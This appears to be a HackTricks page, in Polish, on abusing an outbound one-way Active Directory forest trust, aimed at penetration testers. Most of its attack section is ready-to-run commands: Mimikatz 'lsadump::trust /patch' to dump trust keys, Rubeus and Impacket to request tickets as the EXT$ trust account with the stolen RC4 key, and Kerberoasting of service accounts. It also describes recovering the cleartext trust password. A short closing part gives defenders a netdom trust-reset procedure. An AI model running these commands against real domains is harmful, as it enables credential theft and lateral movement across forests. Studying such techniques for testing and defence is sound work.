# Zewnętrzna domena lasu - jednokierunkowe (wychodzące)

{{#include ../../banners/hacktricks-training.md}}

W tym scenariuszu **Twoja domena** **nadaje pewne uprawnienia** podmiotom z **innej domeny/lasu**.

## Enumeracja

### Zaufanie wychodzące
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Jeśli moduł AD jest dostępny, przeanalizuj również bezpośrednio **Trusted Domain Object (TDO)**. Dostarczy to surowych danych zaufania opartych na LDAP, których później potrzebujesz, aby zdecydować, czy łatwiejszą ścieżką będzie **FSP/group abuse**, czy **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Powinieneś również ustalić, gdzie obce principals z `CN=ForeignSecurityPrincipals` faktycznie otrzymały uprawnienia. Typowe przypadki to:

- **Local admin** na serwerze/DC w bieżącej domenie
- Członkostwo w **custom domain group**, która ma ACL nad użytkownikami/komputerami/GPO
- Uprawnienia do modyfikowania **computer objects**, które później mogą stać się [RBCD](resource-based-constrained-delegation.md), jeśli konfiguracja trustu na to pozwala

## Trust Account Attack

Gdy one-way trust zostaje utworzony z domain/forest **B** do domain/forest **A** (**B trusts A**), w **A** zostaje utworzone **trust account** dla **B**. Z perspektywy outbound trust w **A** jest to przydatne, ponieważ po późniejszym przejęciu **B** (strony ufającej) możesz zrzucić znajdujący się tam trust secret i uwierzytelnić się z powrotem do **A** jako `B$`.<sup>[[1]](#references)</sup>

Najważniejszym aspektem, który należy tu zrozumieć, jest to, że hasło i materiał Kerberos dla tego trust account można wyciągnąć z Domain Controller w **trusting domain** za pomocą:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Działa to, ponieważ konto relacji zaufania utworzone w domenie **trusted** jest włączonym podmiotem, który uzyskuje podstawowe uprawnienia zwykłego użytkownika domeny. Często wystarcza to do rozpoczęcia enumeracji LDAP, żądania ticketów i znalezienia kolejnej ścieżki eskalacji.<sup>[[1]](#references)</sup>

W scenariuszu, w którym `ext.local` jest domeną **trusting**, a `root.local` domeną **trusted**, konto użytkownika o nazwie `EXT$` zostaje utworzone wewnątrz `root.local`. Zrzucenie kluczy relacji zaufania z `ext.local` ujawnia dane uwierzytelniające, których można użyć jako `root.local\EXT$` przeciwko `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Następnie użyj wyodrębnionego klucza **RC4**, aby uwierzytelnić się jako `root.local\EXT$` wewnątrz `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Następnie wykonaj enumerację zaufanej domeny jako ten principal, na przykład poprzez Kerberoasting wysokowartościowego SPN w `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Z systemu Linux

Jeśli odzyskałeś klucz konta zaufania **RC4**, ta sama metoda działa z systemu Linux za pomocą Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Jeśli **RC4** nie jest akceptowany, użyj odzyskanego **hasła w postaci jawnego tekstu** (lub wyprowadzonych kluczy **AES**) i ponownie wykorzystaj standardowe procedury [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) oraz [Kerberoast](kerberoast.md) z tego footholdu.

### Pułapki dotyczące materiału kluczowego

Nie pomyl **kluczy trust** z **poświadczeniami konta trust**:<sup>[[1]](#references)</sup>

- W relacji one-way trust obie strony przechowują **TDO**, ale właściwe konto użytkownika **`EXT$` istnieje wyłącznie w trusted domain**.
- Aktualne hasło konta trust jest odzwierciedlone w sekrecie trust TDO (`NewPassword` / current trust key).
- Klucz trust **RC4** jest najłatwiejszym do ponownego wykorzystania artefaktem w `asktgt` jako konto trust; w konfiguracjach domyślnych jest to zwykle działający enctype, ponieważ konto trust często ma puste `msDS-SupportedEncryptionTypes`.
- Jeśli myślisz o kluczach trust **AES**, pamiętaj, że nie są one wymienne z kluczami AES konta trust, ponieważ wartości salt są różne.

Dlatego w przypadku techniki opisanej na tej stronie preferuj zrzut materiału **RC4** albo odzyskane **hasło w postaci jawnego tekstu**.<sup>[[1]](#references)</sup>

### Pozyskiwanie hasła w postaci jawnego tekstu

W poprzednim przepływie użyto hasha trust zamiast **hasła w postaci jawnego tekstu** (które również jest **zrzucane przez mimikatz**).<sup>[[1]](#references)</sup>

Hasło w postaci jawnego tekstu można uzyskać, konwertując wynik \[ CLEAR ] z mimikatz z formatu szesnastkowego i usuwając bajty null `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Pozyskiwanie hasła w postaci jawnego tekstu: Hasło w postaci jawnego tekstu można uzyskać, konwertując wynik ( CLEAR ) z mimikatz z formatu szesnastkowego i usuwając bajty null...](<../../images/image (938).png>)

Czasami podczas tworzenia relacji trust użytkownik musi wpisać hasło dla trust. W tej demonstracji kluczem jest oryginalne hasło trust, dlatego jest ono czytelne dla człowieka. Gdy klucz jest rotowany (domyślnie: co 30 dni), hasło w postaci jawnego tekstu zwykle przestaje być czytelne dla człowieka, ale nadal jest technicznie użyteczne.<sup>[[1]](#references)</sup>

Hasła w postaci jawnego tekstu można użyć do przeprowadzenia standardowego uwierzytelniania jako konto trust, jako alternatywy dla żądania TGT przy użyciu sekretnego klucza Kerberos konta trust. Tutaj zapytanie do `root.local` z `ext.local` o członków `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Pozyskiwanie hasła w postaci jawnego tekstu: Hasła w postaci jawnego tekstu można użyć do przeprowadzenia standardowego uwierzytelniania jako konto trust, jako alternatywy dla żądania TGT...](<../../images/image (792).png>)

### Ograniczenia praktyczne

> [!WARNING]
> Konta trust są nietypowymi principalami. Logowania interaktywne, takie jak **RUNAS / console / RDP**, nie są tutaj oczekiwaną ścieżką, a próby uwierzytelniania **NTLM** mogą zakończyć się błędem `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Zamiast tego zaplanuj logowania sieciowe **Kerberos** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Uwaga dotycząca persistence / cleanup

Jeśli obrońcy zorientują się, że trusted domain została przejęta, powinni zrotować sekret trust **po obu stronach** za pomocą `netdom trust ... /resetOneSide ...`. Z perspektywy operatora ma to znaczenie, ponieważ **ręczny reset natychmiast unieważnia stary materiał trust**, podczas gdy standardowa rotacja hasła trust zachowuje bieżące/poprzednie wartości w trakcie rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Odnośniki

- [1] [SID filter jako granica bezpieczeństwa między domenami? (Część 7) – atak na konto zaufania – od ufającej do zaufanej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [Odzyskiwanie lasu AD – resetowanie hasła zaufania](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
